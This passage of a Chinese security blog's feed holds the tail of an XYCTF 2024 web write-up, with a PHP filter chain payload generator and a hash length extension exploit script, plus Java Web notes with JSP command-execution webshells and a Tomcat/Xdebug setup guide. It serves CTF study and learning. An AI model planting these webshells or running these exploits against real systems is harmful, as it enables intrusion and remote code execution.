don&#x27;t add the decode while debugging chains</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">    final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> final_payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Parsing command line arguments</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;PHP filter chain generator.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">&quot;--chain&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Content you want to generate. (you will maybe need to pad with spaces for your payload to work)&quot;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--rawbase64&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.&quot;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.chain <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        chain = args.chain.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        base64_value = base64.b64encode(chain).decode(<span class="string">&#x27;utf-8&#x27;</span>).replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        chain = generate_filter_chain(base64_value)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] The following gadget chain will generate the following code : &#123;&#125; (base64 value: &#123;&#125;)&quot;</span>.<span class="built_in">format</span>(args.chain, base64_value))</span><br><span class="line">        <span class="built_in">print</span>(chain)</span><br><span class="line">    <span class="keyword">if</span> args.rawbase64 <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        rawbase64 = args.rawbase64.replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">match</span> = re.search(<span class="string">&quot;^([A-Za-z0-9+/])*$&quot;</span>, rawbase64)</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">match</span>):</span><br><span class="line">            chain = generate_filter_chain(rawbase64, <span class="literal">True</span>)</span><br><span class="line">            <span class="built_in">print</span>(chain)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;[-] Base64 string required.&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>把XYCTF多base64encode几次,然后用脚本生成payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 php_filter_chain_generator.py --chain Vm1wQ1lXTXhTa2RYYTFwWVZWRQ</span><br></pre></td></tr></table></figure><p>得到的payload多加五个base64-decode即可</p><h2 id="ezLFI"><a href="#ezLFI" class="headerlink" title="ezLFI"></a>ezLFI</h2><p>这题可以用php_filter_chain直接解掉了, 但是考点看起来应该是nginx fast-cgi响应过大产生临时文件的那个trick</p><p><a href="https://tttang.com/archive/1384/#toc_0x02-includers-revenge-nginx-fastcgi-temp-lfi">https://tttang.com/archive/1384/#toc_0x02-includers-revenge-nginx-fastcgi-temp-lfi</a></p><p>后面补一下吧</p><h2 id="give-me-flag-赛后"><a href="#give-me-flag-赛后" class="headerlink" title="give me flag(赛后)"></a>give me flag(赛后)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$FLAG_md5</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$FLAG_md5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line"><span class="variable">$md5</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>.<span class="variable">$value</span>.<span class="variable">$time</span>)===<span class="variable">$md5</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;yes, give you flag: &quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">&#125;</span><br><span class="line">cc584e52a25c194614d8f8dff57c7f72</span><br></pre></td></tr></table></figure><p>一眼哈希扩展攻击, hashpump没了, 装了hexpand,一直报段错误….遂放弃</p><p>推荐另一个项目</p><p><a href="https://github.com/shellfeel/hash-ext-attack">https://github.com/shellfeel/hash-ext-attack</a></p><p>可以在下面一个连接直接查看当前unix时间戳</p><p><a href="https://tool.chinaz.com/tools/unixtime.aspx">https://tool.chinaz.com/tools/unixtime.aspx</a></p><p>稍微预测一个提前量:</p><p>1714286382</p><p>1714286700</p><p>扩展md5</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240428144622394.png" alt="image-20240428144622394"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://127.0.0.1:55475/&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;?md5=e84fbfa78340af6d44eedfd75c59445d&amp;value=%80%00%00%00%00%00%00%00%00%00%00%00%00X%01%00%00%00%00%00%00&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    res=requests.get(url=url+payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;wait..&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;XYCTF&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240428144636517.png" alt="image-20240428144636517"></p><h2 id="baby-unserialize-未解出"><a href="#baby-unserialize-未解出" class="headerlink" title="baby_unserialize(未解出)"></a>baby_unserialize(未解出)</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XYCTF-2024-Web&quot;&gt;&lt;a href=&quot;#XYCTF-2024-Web&quot; class=&quot;headerlink&quot; title=&quot;XYCTF 2024 Web&quot;&gt;&lt;/a&gt;XYCTF 2024 Web&lt;/h1&gt;&lt;h2 id=&quot;warm-up&quot;&gt;&lt;a href=</summary>
      
    
    
    
    
    <category term="ssti" scheme="http://example.com/tags/ssti/"/>
    
    <category term="命令注入" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"/>
    
    <category term="phar反序列化" scheme="http://example.com/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="LFI" scheme="http://example.com/tags/LFI/"/>
    
  </entry>
  
  <entry>
    <title>Java Web基础</title>
    <link href="http://example.com/2024/04/07/Java-Web%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2024/04/07/Java-Web%E5%9F%BA%E7%A1%80/</id>
    <published>2024-04-07T14:42:56.000Z</published>
    <updated>2024-05-21T14:59:12.224Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-Web"><a href="#Java-Web" class="headerlink" title="Java Web"></a>Java Web</h1><h2 id="Tomcat＋Servlet"><a href="#Tomcat＋Servlet" class="headerlink" title="Tomcat＋Servlet"></a>Tomcat＋Servlet</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>不同java版本对应的tomcat和servlet不太一样, 这里搭配如下:</p><p>java 1.8</p><p>Servlet 3.1.0</p><p>Tomcat 8</p><h3 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>Tomcat-Servlet_Demo<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>手动创建war包目录</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240428235641031.png" alt="image-20240428235641031"></p><h3 id="web-xml"><a href="#web-xml" class="headerlink" title="web.xml"></a>web.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">web-app</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="其他细节参考"><a href="#其他细节参考" class="headerlink" title="其他细节参考"></a>其他细节参考</h3><p><a href="https://www.jianshu.com/p/b4b42a90b2e9">https://www.jianshu.com/p/b4b42a90b2e9</a></p><p><a href="https://blog.csdn.net/qq_52057693/article/details/124260380">https://blog.csdn.net/qq_52057693/article/details/124260380</a></p><h3 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html;charset=utf-8&quot;</span>);</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;hello 你好&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后访问</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240429000025817.png" alt="image-20240429000025817"></p><h2 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h2><blockquote><p>JSP（Java Server Pages），是Java的一种动态网页技术。在早期Java的开发技术中，Java程序员如果想要向浏览器输出一些数据，就必须得手动<code>println</code>一行行的HTML代码。为了解决这一繁琐的问题，Java开发了JSP技术。</p><p>JSP可以看作一个Java Servlet，主要用于实现Java web应用程序的用户界面部分。网页开发者们通过结合HTML代码、XHTML代码、XML元素以及嵌入JSP操作和命令来编写JSP。</p><p>当第一次访问JSP页面时，Tomcat服务器会将JSP页面翻译成一个java文件，并将其编译为.class文件。JSP通过网页表单获取用户输入数据、访问数据库及其他数据源，然后动态地创建网页。</p></blockquote><p>直接在webapp文件夹下创建jsp文件即可</p><p>脚本程序的语法格式：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% 代码片段 %&gt;</span><br></pre></td></tr></table></figure><p>或者，您也可以编写与其等价的XML语句，就像下面这样：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:scriptlet&gt;</span><br><span class="line">   代码片段</span><br><span class="line">&lt;/jsp:scriptlet&gt;</span><br></pre></td></tr></table></figure><p>任何文本、HTML标签、JSP元素必须写在脚本程序的外面。</p><h3 id="JSP声明"><a href="#JSP声明" class="headerlink" title="JSP声明"></a>JSP声明</h3><p>一个声明语句可以声明一个或多个变量、方法，供后面的Java代码使用。在JSP文件中，您必须先声明这些变量和方法然后才能使用它们。</p><p>JSP声明的语法格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! declaration; [ declaration; ]+ ... %&gt;</span><br></pre></td></tr></table></figure><p>或者，您也可以编写与其等价的XML语句，就像下面这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:declaration&gt;</span><br><span class="line">   代码片段</span><br><span class="line">&lt;/jsp:declaration&gt;</span><br></pre></td></tr></table></figure><p>程序示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! int i = 0; %&gt; </span><br><span class="line">&lt;%! int a, b, c; %&gt; </span><br><span class="line">&lt;%! Circle a = new Circle(2.0); %&gt; </span><br></pre></td></tr></table></figure><hr><h3 id="JSP表达式"><a href="#JSP表达式" class="headerlink" title="JSP表达式"></a>JSP表达式</h3><p>一个JSP表达式中包含的脚本语言表达式，先被转化成String，然后插入到表达式出现的地方。</p><p>由于表达式的值会被转化成String，所以您可以在一个文本行中使用表达式而不用去管它是否是HTML标签。</p><p>表达式元素中可以包含任何符合Java语言规范的表达式，但是不能使用分号来结束表达式。</p><p>JSP表达式的语法格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= 表达式 %&gt;</span><br></pre></td></tr></table></figure><p>同样，您也可以编写与之等价的XML语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:expression&gt;</span><br><span class="line">   表达式</span><br><span class="line">&lt;/jsp:expression&gt;</span><br></pre></td></tr></table></figure><h2 id="Java木马"><a href="#Java木马" class="headerlink" title="Java木马"></a>Java木马</h2><h3 id="JSP木马"><a href="#JSP木马" class="headerlink" title="JSP木马"></a>JSP木马</h3><p>传统无回显木马</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)); %&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240429191039735.png" alt="image-20240429191039735"></p><p>有回显木马:</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;% <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)!=<span class="literal">null</span>)&#123;</span><br><span class="line">    java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line"> </span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">    String line;</span><br><span class="line">    <span class="type">PrintWriter</span> <span class="variable">printWriter</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">    printWriter.write(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">        printWriter.println(line);</span><br><span class="line">    &#125;</span><br><span class="line">    printWriter.write(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>如上的木马特征强,容易识别, 且需要文件落地, 由此,引出隐蔽性强,无需文件的内存马</p><h3 id="Tomcat内存马"><a href="#Tomcat内存马" class="headerlink" title="Tomcat内存马"></a>Tomcat内存马</h3><p>后面需要调试Tomcat, 重新弄个环境,参考:</p><p><a href="https://zhuanlan.zhihu.com/p/35454131">https://zhuanlan.zhihu.com/p/35454131</a></p><p>在此之前, 需要先了解Tomcat架构</p><p>膜拜大佬博客</p><p><a href="https://goodapple.top/archives/1359">https://goodapple.top/archives/1359</a></p><h4 id="Tomcat三大组件"><a href="#Tomcat三大组件" class="headerlink" title="Tomcat三大组件"></a>Tomcat三大组件</h4><p><a href="https://goodapple.top/archives/1359">https://goodapple.top/archives/1359</a></p><p>三大组件的加载顺序为<code>**Listener-&gt;Filter-&gt;Servlet**</code>。</p><h4 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h4><blockquote><p>在Tomcat中，Context是Container组件的一种子容器，其对应的是一个Web应用。Context中可以包含多个Wrapper容器，而Wrapper对应的是一个具体的Servlet定义。因此Context可以用来保存一个Web应用中多个Servlet的上下文信息。</p></blockquote><h4 id="Tomcat中的三种Context"><a href="#Tomcat中的三种Context" class="headerlink" title="Tomcat中的三种Context"></a>Tomcat中的三种Context</h4><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/1-795x1500.jpg"></p><blockquote><p>ServletContext接口的实现类为ApplicationContext类和ApplicationContextFacade类，其中ApplicationContextFacade是对ApplicationContext类的包装。我们对Context容器中各种资源进行操作时，最终调用的还是StandardContext中的方法，因此StandardContext是Tomcat中负责与底层交互的Context。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java-Web&quot;&gt;&lt;a href=&quot;#Java-Web&quot; class=&quot;headerlink&quot; title=&quot;Java Web&quot;&gt;&lt;/a&gt;Java Web&lt;/h1&gt;&lt;h2 id=&quot;Tomcat＋Servlet&quot;&gt;&lt;a href=&quot;#Tomcat＋Servlet&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>PHP storm + Xdebug 远程调试docker项目</title>
    <link href="http://example.com/2024/03/27/PHP-storm-Xdebug-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95docker%E9%A1%B9%E7%9B%AE/"/>
    <id>http://example.com/2024/03/27/PHP-storm-Xdebug-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95docker%E9%A1%B9%E7%9B%AE/</id>
    <published>2024-03-27T14:02:29.000Z</published>
    <updated>2024-03-27T16:32:26.062Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP-storm-Xdebug-远程调试docker项目-ssh隧道"><a href="#PHP-storm-Xdebug-远程调试docker项目-ssh隧道" class="headerlink" title="PHP storm + Xdebug 远程调试docker项目(ssh隧道)"></a>PHP storm + Xdebug 远程调试docker项目(ssh隧道)</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/web/266512.html">https://www.freebuf.com/articles/web/266512.html</a></p><h2 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h2><ol><li>docker环境</li><li>你需要调试的项目</li></ol><p>这里需要调试的项目以上次在做NKCTF的一道题目为例</p><p>题目原 Dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ctfhub/web_nginx_mysql_php_8.<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> files /var/www/html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sh -c <span class="string">&#x27;mysqld_safe &amp;&#x27;</span> \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">sleep</span> 5s \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; mysql -e <span class="string">&quot;source /var/www/html/db.sql;&quot;</span> -uroot -proot </span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/config</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/data</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/static</span></span><br></pre></td></tr></table></figure><p>我们需要对dockerfile进行修改以使用于调试</p><ol><li>安装ssh服务。 PHPSTORM需要 ssh 来进行目录映射，不然无法成功 Debug</li><li>安装 xdebug。这是调试的基础扩展组件</li><li>设置 ssh 允许 root 登陆。毕竟只是个 docker 调试环境，就不弄那么麻烦了。当然如果是线上业务啥的当然要做好权限分配。</li><li>修改 root密码。毕竟不知道密码也无法连接</li><li>启动 ssh 服务</li><li>重启 apache 服务</li></ol><p>可以看见这里拉取了php8.0, 这里我们需要下载安装对应版本的xdebug, 这非常关键!!!</p><p>附一个各php版本对应的xdebug版本, 其他版本另行搜索</p><table><thead><tr><th>php版本</th><th>xdebug版本</th></tr></thead><tbody><tr><td>php7.0</td><td>xdebug 2.8.1</td></tr><tr><td>php7.1</td><td>xdebug 2.9.8</td></tr><tr><td>php7.2</td><td>xdebug 3.1.5</td></tr><tr><td>php7.3</td><td>xdebug 3.1.5</td></tr><tr><td>php7.4</td><td>xdebug 3.1.5</td></tr><tr><td>php8.0</td><td>xdebug 3.1.5</td></tr><tr><td>php8.1</td><td>xdebug 3.1.5</td></tr></tbody></table><p>因此我们需要的是xdebug 3.1.5</p><p>去这个网站查看xdebug(不需要下载下来)</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240327221042712.png" alt="image-20240327221042712"></p><p>可以看见对应有xdebug 3.1.5按照这个文件名, 添加一个dockerfile语句</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pecl install http://pecl.php.net/get/xdebug-3.1.5.tgz &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    docker-php-ext-enable 